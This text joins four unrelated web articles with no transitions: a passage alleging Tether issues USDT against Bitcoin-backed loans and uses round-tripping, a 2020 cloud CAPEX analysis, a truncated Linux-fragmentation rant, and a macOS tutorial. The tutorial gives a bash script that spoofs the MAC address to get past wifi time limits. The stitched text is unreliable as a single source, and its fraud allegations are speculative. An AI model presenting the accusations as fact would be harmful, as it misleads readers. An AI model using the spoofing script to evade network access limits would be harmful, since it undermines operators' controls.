<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-1024x380.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-1024x380.png 1024w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-300x111.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37-768x285.png 768w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-06-at-20.08.37.png 1136w" sizes="(max-width: 1024px) 100vw, 1024px"></figure>



<p>This move has greatly increased the Bitcoin supply, to the tune of 1 million Bitcoins. These are Bitcoins that have been gradually released from being frozen as collateral, and are now available for other types of use.</p>



<p>The increased acceptance of USDT are also replacing Bitcoin for the transfer use case, as they aren’t volatile, and can be sent almost instantly. This has reduced Bitcoin turnover.</p>



<h3>Bitcoin to the moon… HOW?</h3>



<p>Given the rise of USDT in circulation has increased Bitcoin supply and reduced its turnover, the impact of the Tether collateral flippening on $BTC should have been disastrous. Yet, Bitcoin is up tenfold since the start of the trend. How is this possible?</p>



<p>The knee-jerk response from Bitcoiners will be that a lot of new demand for Bitcoin has emerged at the same time, citing Michael Saylor’s MicroStrategy and Grayscale. But we’re talking about 1.3 million Bitcoins (released from collateral and newly mined) in less than a year! That’s one hell of an exogenous event that should have crushed the price, right?</p>



<p>Well, no – because the event wasn’t exogenous; it was decided by the crypto community insiders – mostly Binance, Bitfinex and Tether. They knew that by releasing all this Bitcoin into the market, they would crush the price. So, they didn’t.</p>



<p>If you were to follow Tether’s own advertised rules, where new USDTs are issued only against matching USD deposits, the Tether collateral flippening should have followed this path:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08.png 878w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08-300x141.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.18.08-768x362.png 768w" sizes="(max-width: 878px) 100vw, 878px"></figure>



<p>Instead, what happened is this:</p>



<figure><img src="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34.png" alt="" srcset="http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34.png 853w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34-300x69.png 300w, http://www.tr0lly.com/wp-content/uploads/2021/02/Screen-Shot-2021-02-07-at-16.21.34-768x176.png 768w" sizes="(max-width: 853px) 100vw, 853px"></figure>



<p>This path has two huge advantages:</p>



<ul><li>no fiat is needed</li><li>no Bitcoins are released into Supply</li></ul>



<p>It also has one small disadvantage:</p>



<ul><li>Tether has to lie about how USDTs are issued and what its reserves are made of</li></ul>



<p>Note that this disadvantage can be easily solved by round-tripping, a practice that was once dear to Wirecard, where a very small amount of fiat circulates a lot of times between everyone involved, to make it look like there are transactions. Meaning that Binance doesn’t send Bitcoins in exchange of USDT directly to Tether. They first put these Bitcoins as collateral for a loan from Tether, then wire the proceeds of the loan to Tether, and get USDTs in return. Exactly the same result as buying Bitcoin with USDT, but very different appearances and paper trail.</p>



<h3>USDTs are backed by Bitcoin</h3>



<p>More accurately, Tether’s reserves are loans to exchanges, collateralized by Bitcoin. The Bitcoins that were used as collateral for margin trading, are now used as collateral for USDT. This way, exchanges know that USDTs are actually worth something, and accept to maintain the 1:1 peg. And no fiat needs to be deposited at Tether, a small and shady company with no offices, under investigation by the NYAG, with a shaky banking relationship with Deltec that’s not even a real bank.</p>



<p>This is the only way the Tether collateral flippening wouldn’t have crushed Bitcoin’s price. The question that remains to be answered is, if exchanges accept that Tether issues USDTs backed by Bitcoin, why not print some USDT out of thin air to buy Bitcoin with it, and pump $BTC in an effort to ignite another round of FOMO?</p>

<p>It is time for our annual bulletin to <a href="https://www.platformonomics.com/tag/capex/">CAPEX obsessives</a> (previous updates from <a href="https://www.platformonomics.com/www.platformonomics.com/2017/04/follow-the-capex-cloud-table-stakes/">2016</a>, <a href="https://www.platformonomics.com/2018/04/follow-the-capex-cloud-table-stakes-2017-edition/">2017</a>, <a href="https://www.platformonomics.com/2019/02/follow-the-capex-cloud-table-stakes-2018-edition/">2018</a>, <a href="https://www.platformonomics.com/2020/02/follow-the-capex-cloud-table-stakes-2019-edition/">2019</a> as well as <a href="https://www.platformonomics.com/tag/capex/">earlier</a> installments). The hashtag for CAPEX 2020 is “#bonkers”.</p>



<p><strong>The three hypercloud companies – Amazon, Google, and Microsoft – collectively spent almost $97 billion on CAPEX in 2020</strong>, up 32% from 2019’s $73.5 billion. Amazon and Microsoft’s spending again hit new highs (bonkers new highs in Amazon’s case) while Google’s spending declined for the second year in a row. <strong>Amazon spent more on CAPEX than <u>any </u>company (not just cloud companies) in 2020 </strong><a href="#*" data-type="internal" data-id="#*">[*]</a><strong>.</strong></p>



<p>Standard caveat: The reported numbers are the companies’ total CAPEX spend, not just cloud infrastructure, so includes land, office buildings, <a href="https://www.geekwire.com/2020/emptied-pandemic-overtaken-cranes-microsoft-hq-symbol-changing-world/">campus redevelopments</a>, warehouses, <a href="https://www.geekwire.com/2021/amazon-adds-palm-reading-biometric-id-scanner-physical-retail-stores-seattle/">panopticonvenience stores</a>, manufacturing tooling, self-driving cars, delivery trucks, flying machines, <a href="https://www.geekwire.com/2020/amazons-project-kuiper-drops-hints-customer-terminals-satellite-internet/">satellite constellations</a>, hardware that both is and is not required for quantum computing, and – the dream is admittedly on life support – a Google space elevator. The numbers include finance leases for both Amazon and Microsoft, as well as build-to-suit leases for Amazon (these are debt instruments used to finance specific CAPEX expenditures, namely servers and buildings).</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-5.png"><img loading="lazy" width="868" height="504" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-5.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-5.png 868w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-5-300x174.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-5-768x446.png 768w" sizes="(max-width: 868px) 100vw, 868px"></a></figure>



<p><strong>In 2020, Amazon’s CAPEX was up a mere 69% to just shy of an absolutely bonkers $54 billion, Google’s spend declined over 5% to $22.3 billion and Microsoft’s increased 14% to $20.6 billion. </strong>Amazon (company slogan: “a penny of free cash flow is a terrible thing to waste on abstract accounting constructs like profits”) is accelerating its spending and may soon achieve orbital escape velocity on the back of its CAPEX trajectory, rendering Jeff Bezos’ personal space program unnecessary.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-6.png"><img loading="lazy" width="940" height="572" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-6.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-6.png 940w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-6-300x183.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-6-768x467.png 768w" sizes="(max-width: 940px) 100vw, 940px"></a></figure>



<p>It is beyond bonkers that <a href="https://arstechnica.com/information-technology/2013/03/vmware-targets-rival-bookseller-amazon-with-its-own-public-cloud/">“a company that sells books”</a> spends more on CAPEX than any other company <a href="#*" data-type="internal" data-id="#*">[*]</a>. And the idea that our other two “software companies” have a CAPEX spend in the same league or beyond the biggest automakers, energy companies, semiconductor manufacturers, and telcos in the world is likewise bonkers.</p>



<p><a name="*">[*]</a> Where “any other company” is defined as the random set I looked up and charted above. Are there other big spenders I’ve missed? I didn’t look at Chinese companies, mostly because I’m lazy, but also because often their investments are non-economic, accounting dodgy, and audits optional, even for companies listed in the US (if only domestic companies had that luxury, but Wall Street still dreams of selling a collaterized debt obligation to each and every person in China).</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-7.png"><img loading="lazy" width="854" height="504" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-7.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-7.png 854w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-7-300x177.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-7-768x453.png 768w" sizes="(max-width: 854px) 100vw, 854px"></a></figure>



<p><strong>The three hyperclouds’ cumulative CAPEX spend since 2000 is almost $444 billion</strong>, with over $170 billion of that occurring in the last two years. Efforts to find an amusing comparable failed.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-8.png"><img loading="lazy" width="856" height="506" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-8.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-8.png 856w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-8-300x177.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-8-768x454.png 768w" sizes="(max-width: 856px) 100vw, 856px"></a></figure>



<p>As a percentage of revenue, hypercloud CAPEX is clustered between 12 and 14% of revenue, with Amazon edging out Microsoft for the top spot this year.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-14.png"><img loading="lazy" width="724" height="436" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-14.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-14.png 724w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-14-300x181.png 300w" sizes="(max-width: 724px) 100vw, 724px"></a></figure>



<p>Azure and Google Cloud (which includes both Google Cloud Platform and whatever they are calling Google Docs this week) have both seen growth accelerate slightly since “<a href="https://www.platformonomics.com/2020/03/the-geopolitical-game-board-march-2020/">a bat out of Wuhan</a>” became the new “butterfly effect”. The AWS growth rate is lower, but they grew revenue by over $10 billion in 2020, so their dollar growth alone is bigger than GCP.</p>



<h2><strong>Amazon #bonkers</strong></h2>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-10.png"><img loading="lazy" width="858" height="504" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-10.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-10.png 858w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-10-300x176.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-10-768x451.png 768w" sizes="(max-width: 858px) 100vw, 858px"></a></figure>



<p>By most standards, Amazon had an absolutely magnificent pandemic year (some might say “bonkers”). Revenue growth nearly doubled to 38% from 20% growth the previous year, bringing in over $386 billion. Profits almost doubled. And they spent the aforementioned bonkers CAPEX to support that growth while providing an essential lifeline to hundreds of millions of people in isolation amidst a global pandemic. Not bad.</p>



<p>Amazon’s cash out of pocket for CAPEX exploded: 2020 spending was 238% of the previous year, with over $23 billion incremental spent on hard assets. Debt-funded CAPEX declined 8% (with capital leases — probably AWS servers — down 15% while the smaller sum of built-to-suit real estate leases increased as they grew their warehouse space by 50%). Over the past couple years, Amazon’s CAPEX outlay was split roughly half cash and half debt. In 2020, the cash spend ballooned to 75%. There clearly was a push to spend as much as possible on hard assets (“Quick, <a href="https://www.geekwire.com/2021/amazon-air-makes-first-outright-purchase-planes-buying-11-boeing-jets-expand-cargo-fleet/">buy as many wide-body airplanes</a> as you can before the end of the year!”).</p>



<p>Amazon has always managed for free cash flow, as opposed to profits. Despite the numbers above, the pandemic year was an all-time low when measured against their financial priorities. Even though they stuffed an additional $23 billion into CAPEX, the company was unable to reinvest most of its cash flow into the business and (embarrassingly) reported profits of over $21 billion. One could almost speculate that Bezos’ departure as CEO is not so much his choice, but reflects the board’s disappointment in his dismal 2020 cash flow performance.</p>



<p>At this point, AWS accounts for a small fraction of Amazon’s CAPEX spending, and examining overall Amazon CAPEX – except as an excuse to use the word bonkers– is ever less relevant to cloud infrastructure discussions. The finance leases historically have been the best tell on AWS cloud infrastructure investments, as they reflected server purchases.</p>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-11.png"><img loading="lazy" width="724" height="436" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-11.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-11.png 724w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-11-300x181.png 300w" sizes="(max-width: 724px) 100vw, 724px"></a></figure>



<p>If we look at AWS revenue vs. finance leases, we can see they have decoupled, particularly in the last two years. The company probably paid cash in 2020 to convert some of its pandemic windfall into servers, and has less need to use debt to realize its CAPEX ambitions.</p>



<h2><strong>Google</strong></h2>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-12.png"><img loading="lazy" width="940" height="474" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-12.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-12.png 940w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-12-300x151.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-12-768x387.png 768w" sizes="(max-width: 940px) 100vw, 940px"></a></figure>



<p>Following Amazon last year, Google is now moving to depreciating their servers over four years:</p>



<blockquote><p>As noted in our earnings press release, we have adjusted the estimated useful lives of servers and certain network equipment starting in 2021. We expect these changes will favorably impact our 2021 operating results by approximately $2.1 billion for assets as of year-end 2020.</p></blockquote>



<p>That bold bean counter move has a multi-billion impact on their accounting earnings, but as seen by their CAPEX/revenue number, Google has been on a four-year server cycle for a long time. Yet more evidence that accounting can be distracting. CAPEX obsessives care about the gross spend on silicon, glass, steel and concrete, and don’t waste time netting out accounting abstractions like depreciation.</p>



<p>Based on that four-year cycle, we expect Google’s next CAPEX up-cycle in 2022. The company has highlighted they are investing heavily in Google Cloud, but we don’t see it in the CAPEX numbers. Even as they <a href="https://www.itprotoday.com/iaaspaas/google-expanding-google-cloud-regions-2021" data-type="URL" data-id="https://www.itprotoday.com/iaaspaas/google-expanding-google-cloud-regions-2021">expand their footprint</a> into more geographies, the infrastructure for search and YouTube are vastly larger. Google’s commentary on Google Cloud emphasizes most of that investment is in people.</p>



<p>Google (why does the Alphabet conceit still exist?) also stopped breaking out CAPEX for Other Bets this year, as Loon joined Makani and Titan in the aerial wing of the <a href="https://killedbygoogle.com/">Killed By Google</a> cemetery. Google continues to <a href="https://www.platformonomics.com/2020/07/can-brian-hall-fix-what-ails-google-cloud/">shed its Googley-ness</a> and will fail to deliver a space elevator, calling into question their entire existence and social contract compliance. I await Congressional hearings on what went wrong with the space elevator.</p>



<h2><strong>Microsoft</strong></h2>



<figure><a href="https://www.platformonomics.com/wp-content/uploads/2021/02/image-13.png"><img loading="lazy" width="940" height="474" src="https://www.platformonomics.com/wp-content/uploads/2021/02/image-13.png" alt="" srcset="https://www.platformonomics.com/wp-content/uploads/2021/02/image-13.png 940w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-13-300x151.png 300w, https://www.platformonomics.com/wp-content/uploads/2021/02/image-13-768x387.png 768w" sizes="(max-width: 940px) 100vw, 940px"></a></figure>



<p>Microsoft’s CAPEX remains boring, monotonic and inscrutable, as I have not been able to tease apart their spending on Azure, Office 365 and Bing (which may be a distant number two to Google, but search still has huge infrastructure requirements to store all those copies of the entire Web). There was a brief moment of <a href="https://www.platformonomics.com/2020/10/pandemic-capex-q3-2020-update/">excitement</a> right after the pandemic broke when Microsoft was short on servers due to supply chain disruptions, but that was remedied the next quarter and boringness restored. Hopefully they can do more CAPEX-wise this year to stand out in this annual commentary.</p>

<p>As an operating system GNU/Linux has become a mess because of the fragmented nature of the project, the bloatware in the kernel, but mainly because of the manipulation by corporate interests. There exist <a href="https://unixsheikh.com/articles/technical-reasons-to-choose-freebsd-over-linux.html">several technical reasons</a> for when a migration from GNU/Linux to BSD make sense, but this article isn't about that, it's an "analyzes" of the current status in Linux-land, and it is an opinionated rant, more than anything else.</p>

<h2 id="introduction">Introduction</h2>
<p>In the past I have always been a favorite of choosing operating system and tools based upon technical merit. However, in today's world of companies like Microsoft, Apple, Google, and many others, compromising user privacy, and conducting controversial activities, I don't believe that to be the right cause of action.</p>
<p>Proprietary operating systems like <a href="https://en.wikipedia.org/wiki/Windows_10#Privacy_and_data_collection">Microsoft Windows 10</a>, <a href="https://gist.github.com/iosecure/357e724811fe04167332ef54e736670d">Apple MacOS</a>, and <a href="https://en.wikipedia.org/wiki/Android_%28operating_system%29#Security_and_privacy">Google Android</a> have become famous for their ill conduct, and even companies like Lenovo is using UEFI boot to inject custom Windows components, so that the system can phone home to Lenovo.</p>
<p>I have been a proponent for the open source alternatives, like GNU/Linux and BSD, for a very long time. Not only that, I also believe that the open source alternatives are much better in many technical areas.</p>
<p>I have also always been very much against <a href="https://www.unixsheikh.com/articles/the-typical-discussions-about-bsd-vs-linux.html">The typical discussions about BSD vs Linux</a>, and as I wrote in my article back then, I have always believed that the different open source projects can help each other and cooperate, and that end-users should only debate such issues from a technical stand point rather than personal preference.</p>
<p>Whenever it has been possible, I have proposed people, both private and in the industry, to change the operating systems they use to open source alternatives, and when people have been receptive to my advocacy I have helped them migrate from Microsoft Windows on their workstations to BSD or Linux. And likewise on the server side. This has been a truly successful endeavor and I have honestly never experienced a dissatisfied person or company.</p>
<p>However, things are beginning to change in the GNU/Linux world as more and more corporations want to control the direction of Linux as an operating system. Due to the structure and organization of GNU/Linux as an operating system, it is unfortunately susceptible to these influences, and while it is still open source, and still not anywhere near the bad things that is going on with the proprietary alternatives, some opt-out features have slowly been introduced into both the kernel and systemd.</p>
<p>You can still choose to opt-out of these features and go your merry way, but as an open source enthusiast and proponent, and as a privacy concerned individual, perhaps the better approach is to migrate systems to something where you don't have to concern yourself with "creepware".</p>
<p>As a system administrator I don't want to worry about whether I am going to be surprised the next time I upgrade a system, and I don't want to keep a list of spyware I have to remember to opt-out of whenever I run one of these systems.</p>
<p>Several Linux distributions have decided (not only because of privacy opt-out issues, but other issues as well) to implement <a href="https://en.wikipedia.org/wiki/Category:Linux_distributions_without_systemd">other init solutions than systemd</a>, but with the situation going on in the kernel development, and with many third party applications becoming more and dependent upon systemd, the problems are spreading to other parts of the operating system and I believe this is becoming an uphill battle.</p>
<p>From a community perspective, and from a security perspective, I don't believe the future of GNU/Linux looks very bright, and as a possible alternative solution I suggest migrating everything (when possible) to something a bit more sane, like one of the BSD projects.</p>

<h2 id="fragmented">Linux is fragmented</h2>
<p>In 1983 Richard Stallman announced his intent to start coding the GNU Project in a Usenet message. By June 1987, the project had accumulated and developed free and open source software for an assembler, an almost finished portable optimizing C compiler (GCC), an editor (GNU Emacs), and various Unix utilities, such as ls, grep, awk, make and ld.</p>
<p>In 1991, the Linux kernel appeared, developed outside the GNU project by Linus Torvalds, and in December 1992 it was made available under version 2 of the GNU General Public License. Combined with the operating system utilities already developed by the GNU project, it became the GNU/Linux operating system, better known as just "Linux".</p>
<p>Then came the Linux distributions. Different projects took the Linux kernel, the GNU tools and libraries, additional third party software, documentation, the X Window System, a window manager, and a desktop environment, and combined those components into the distributions. Different distributions focused on different goals, some put focus on the desktop while others put their main focus on servers, and again others tried to provide a multi-purpose operating system.</p>
<p>In the past all these different components and projects where developed by open source enthusiasts and communities and the passion for programming and open source was the driving force.</p>
<p>This is no longer the case! Please see <a href="https://unixsheikh.com/articles/the-real-motivation-behind-systemd.html">The real motivation behind systemd</a>.</p>
<p>Linus Torvalds has many times made it very clear that he doesn't care about what goes on in the "Linux world", all he cares about is the kernel development, and on January 6, 2020 in the "Moderated Discussions" forum at <a href="https://www.realworldtech.com/forum/?threadid=189711&amp;curpostid=189841">realworldtech.com</a>, Linus Torvalds answered a user's question, with an absolute jaw-dropping comment, about a year-old kernel maintenance controversy that heavily impacted the <a href="https://zfsonlinux.org/">ZFS on Linux</a> project.</p>
<p>After answering the user's actual question, Torvalds went on to make very wrong and damaging claims about the ZFS filesystem. Torvalds said:</p>
<blockquote>
It (ZFS) was always more of a buzzword than anything else.
</blockquote>
<p>By that statements Linus Torvalds has just reduced more that 15 years of development of one of the most robust and popular filesystems in the world into a "buzzword"!</p>
<p>ZFS is described as "The last word in filesystems". It is a combined filesystem and logical volume manager originally designed by Sun Microsystems. ZFS is a stable, fast, secure, and future-proof filesystem. It is scalable, and includes extensive protection against data corruption, support for high storage capacities, a maximum 16 Exabyte file size, and a maximum 256 Quadrillion Zettabytes storage with no limit on number of filesystems (datasets) or files, efficient data compression, snapshots and copy-on-write clones, continuous integrity checking and automatic repair, RAID-Z, native NFSv4 ACLs, and can be very precisely configured.</p>
<p>The two main implementations, by Oracle and by the <a href="https://en.wikipedia.org/wiki/OpenZFS">OpenZFS</a> project, are extremely similar, making ZFS widely available within Unix-like systems.</p>
<p>As mentioned in the Wikipedia article, OpenZFS is an umbrella project aimed at bringing together individuals and companies that use the ZFS file system and work on its improvements, aiming as well at making ZFS more widely used and developed in an open-source manner. OpenZFS brings together developers from the illumos, Linux, FreeBSD, and macOS platforms, and a wide range of companies. High-level goals of the project include raising awareness of the quality, utility and availability of open-source implementations of ZFS, encouraging open communication about ongoing efforts toward improving open-source variants of ZFS, and ensuring consistent reliability, functionality and performance of all distributions of ZFS.</p>
<p><a href="https://github.com/zfsonlinux/zfs/commits/master">OpenZFS on Linux</a>, which is the Linux part of the project, has currently 345 active contributors with more that 5.600 commits, and commits are being made on an almost daily basis!</p>
<p>Some of the worlds biggest CDN and data storage services runs ZFS on either FreeBSD or Linux!</p>
<p>In another situation Linus Torvalds gave an interview on <a href="https://www.youtube.com/watch?v=mysM-V5h9z8">TFiR: open source and Emerging Tech YouTube channel</a> about Linux on the desktop in which he makes another amazing statement saying that Linux still isn't ready for the desktop and that perhaps <a href="https://en.wikipedia.org/wiki/Chrome_OS">Chrome OS</a> is the solution to that problem.</p>
<p>These and many other statements by Linus Torvalds show that Linux as an operating system has no real direction and no clear management because the kernel development is performed in isolation from the rest of the Linux world.</p>
<p>Linus Torvalds is generally also very open to the rapid influence by corporate interests and his perspective on security is also worrying.</p>
<p>In 2009 Linus Torvalds admitted that the kernel development is getting out of control.</p>
<blockquote>
We're getting bloated and huge. Yes, it's a problem ... Uh, I'd love to say we have a plan ... I mean, sometimes it's a bit sad that we are definitely not the streamlined, small, hyper-efficient kernel that I envisioned 15 years ago ... The kernel is huge and bloated, and our icache footprint is scary. I mean, there is no question about that. And whenever we add a new feature, it only gets worse.
</blockquote>
<p>At LinuxCon 2014, he said that he thinks the bloat situation is better because modern PCs are a lot faster!</p>
<blockquote>
We've been bloating the kernel over the last 20 years, but hardware has grown faster.
</blockquote>
<p>This is a very problematic attitude.</p>
<p>When software gets bloated it not only becomes more insecure and more error prone, but it also becomes much slower. Thinking that the problem goes away because hardware becomes faster is an immature attitude. In this day and age we need to optimize software so that less power is required, we need to save power and limit pollution.</p>
<p>In a 2007 interview "Why I quit": kernel developer Con Kolivas he stated:</p>
<blockquote>
If there is any one big problem with kernel development and Linux it is the complete disconnection of the development process from normal users. You know, the ones who constitute 99.9% of the Linux user base. The Linux kernel mailing list is the …</blockquote></article></div>

  <p>For a while, I’ve had notes from <a href="https://www.online-tech-tips.com/computer-tips/how-to-change-mac-address/">Change or Spoof a MAC Address in Windows or OS X</a> saved, so if I am using a wifi connection that limits me to thirty minutes or an hour, I can “spoof” a new MAC address, and when I re-connect to the wifi, the Access Point thinks I’m on a new, unique device.</p>

<p>For the record - when I’m posted up at a coffee shop for an extended period of time, I make sure to <em>buy products regularly</em> in payment for my time. So, if you’re spoofing your MAC address to use wifi for a longer period of time, maybe make sure to spend $5 or $10 when you run the script.</p>

<p>Now, in case you think that I’m actually saving myself time here, I’m totally not. Here’s why:</p>

<p><img src="https://imgs.xkcd.com/comics/automation.png" alt="XKCD Automation" title="'Automating' comes from the roots 'auto-' meaning 'self-', and 'mating', meaning 'screwing'."></p>

<p><em><a href="https://xkcd.com/1319/">XKCD: Automation</a></em></p>

<p>And:</p>

<p><img src="https://imgs.xkcd.com/comics/is_it_worth_the_time.png" alt="XKCD Is it worth the time?" title="Don't forget the time you spend finding the chart to look up what you save. And the time spent reading this reminder about the time spent. And the time trying to figure out if either of those actually make sense. Remember, every second counts toward your life total, including these right now."></p>

<p><em><a href="https://xkcd.com/1205/">XKCD: Is it worth the time?</a></em></p>

<p>Here’s the steps, for someone who’s on a MAC, to spoof your MAC address:</p>
      <h3 id="get-your-current-mac-address">
        
        
          Get your current MAC address <a href="#get-your-current-mac-address">#</a>
        
        
      </h3>
    

<p>Hold down <code>option</code> key, click your wifi icon:</p>

<p><img src="https://josh.works/images/2019-12-11-bash-basics-01.jpg" alt="wifi details"></p>
      <h3 id="figure-out-which-adapter-your-machine-is-using-to-connect-to-the-wifi">
        
        
          Figure out which adapter your machine is using to connect to the wifi <a href="#figure-out-which-adapter-your-machine-is-using-to-connect-to-the-wifi">#</a>
        
        
      </h3>
    

<div><div><pre><code>ifconfig en0 | <span>grep </span>ether <span># one of these will return a MAC address that matches</span>
ifconfig en1 | <span>grep </span>ether <span># the value you saw when looking for your current</span>
ifconfig en2 | <span>grep </span>ether <span># mac address.</span>
ifconfig en3 | <span>grep </span>ether <span># Keep incrementing the `en0` value until you run out of </span>
                          <span># devices</span>
</code></pre></div></div>

<p>Here’s me working through the list:</p>

<p><img src="https://josh.works/images/2019-12-11-basic-bash-02.jpg" alt="checking all ports"></p>

<p>For me, the very first result matched the MAC address I got from <code>option+click</code>ing the wifi network.</p>

<p>That means I’ll be using <code>en0</code> as the [E]ther[N]et adapter I’ll update shortly.</p>

<!--more-->
      <h3 id="generate-a-random-new-mac-address">
        
        
          Generate a random new MAC address <a href="#generate-a-random-new-mac-address">#</a>
        
        
      </h3>
    

<p>A MAC address has a standard-looking format.</p>

<p>It looks like six blocks of two digits, which happen to be <a href="https://en.wikipedia.org/wiki/Hexadecimal">hexadecimal representations</a> of <code>00000000</code> through <code>11111111</code>.</p>

<p>Here’s some randomly-generated MAC addresses:</p>

<div><div><pre><code>e2:81:f6:f6:f9:e8
1f:24:37:47:d6:25
03:20:3f:48:46:ad
</code></pre></div></div>

<p>To generate a random string of characters that produces a <a href="http://sqa.fyicenter.com/1000208_MAC_Address_Validator.html">valid MAC address</a>, run:</p>

<div><div><pre><code>openssl rand -hex 6 | sed 's/\(..\)/\1:/g; s/.$//'
</code></pre></div></div>

<p>And boom. You’ve got a MAC address.</p>

<p>Now we need to update our current MAC address to this new MAC address.</p>
      <h3 id="set-current-mac-address-to-temporarynew-mac-address">
        
        
          Set current mac address to temporary/new MAC address <a href="#set-current-mac-address-to-temporarynew-mac-address">#</a>
        
        
      </h3>
    

<p>You can use <code>ifconfig</code> to set the ethernet address (is that interchangable with the MAC address?) to the randomly-generated string you got from the <code>openssl</code> command:</p>

<div><div><pre><code><span># you need to sudo it, unfortunately. No quotes around the mac address</span>
<span>sudo </span>ifconfig en0 ether xx:xx:xx:xx:xx:xx

<span># here's the full command</span>
<span>sudo </span>ifconfig en0 ether 8c:85:90:5a:79:56
</code></pre></div></div>

<p>And with that, you can re-connect to the wifi network, and it <em>should</em> recognize you as a new device, and let you onto the network.</p>

<p>Here’s what I first ended up with:</p>

<div><div><pre><code><span>#!/bin/bash</span>

<span>echo</span> <span>"Hi! lets change our mac address."</span>
<span>echo</span> <span>"Step 1: hold down option key, click wifi logo. Note the mac address"</span>
<span>echo</span> <span>"Step 2: click 'disconnect from network' "</span>
<span>echo</span> <span>"Step 3: note which ethernet adapter lines up with the mac address you just saw"</span>

<span>en0</span><span>=</span><span>$(</span> ifconfig en0 | <span>grep </span>ether <span>)</span>
<span>en1</span><span>=</span><span>$(</span> ifconfig en1 | <span>grep </span>ether <span>)</span>
<span>en2</span><span>=</span><span>$(</span> ifconfig en2 | <span>grep </span>ether <span>)</span>
<span>en3</span><span>=</span><span>$(</span> ifconfig en3 | <span>grep </span>ether <span>)</span>
<span>en4</span><span>=</span><span>$(</span> ifconfig en4 | <span>grep </span>ether <span>)</span>
<span>en5</span><span>=</span><span>$(</span> ifconfig en5 | <span>grep </span>ether <span>)</span>

<span>echo </span>en0 is: <span>$en0</span>
<span>echo </span>en1 is: <span>$en1</span>
<span>echo </span>en2 is: <span>$en2</span>
<span>echo </span>en3 is: <span>$en3</span>
<span>echo </span>en4 is: <span>$en4</span>
<span>echo </span>en5 is: <span>$en5</span>

<span>read</span> <span>-p</span> <span>'Step 4: Enter which ethernet device lined up with the given mac address: '</span> ether_adapter
<span>export </span><span>ether_adapter</span><span>=</span><span>$ether_adapter</span>

<span>mac</span><span>=</span><span>$(</span> openssl rand <span>-hex</span> 6 | <span>sed</span> <span>"s/</span><span>\(</span><span>..</span><span>\)</span><span>/</span><span>\1</span><span>:/g; s/.</span><span>$/</span><span>/"</span> <span>)</span>
<span>export </span><span>mac</span><span>=</span><span>$mac</span>

<span>echo</span> <span>"btw, here's the new mac address we're going to use: </span><span>$mac</span><span>"</span>
<span>echo</span> <span>"OK, we will change the mac address associated with: </span><span>$ether_adapter</span><span>"</span>

<span>old_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>

<span>echo</span> <span>"The old value was: </span><span>$old_mac</span><span>"</span>

<span>sudo </span>ifconfig <span>$ether_adapter</span> ether <span>$mac</span>

<span>new_mac</span><span>=</span><span>$(</span> ifconfig <span>$ether_adapter</span> | <span>grep </span>ether <span>)</span>

<span>echo</span> <span>"The new value is: </span><span>$new_mac</span><span>"</span>
<span>echo</span> <span>"go ahead and re-connect to the wifi. You should be able to join the network."</span>
</code></pre></div></div>

<p>Believe it or not, this script was far from perfect.</p>

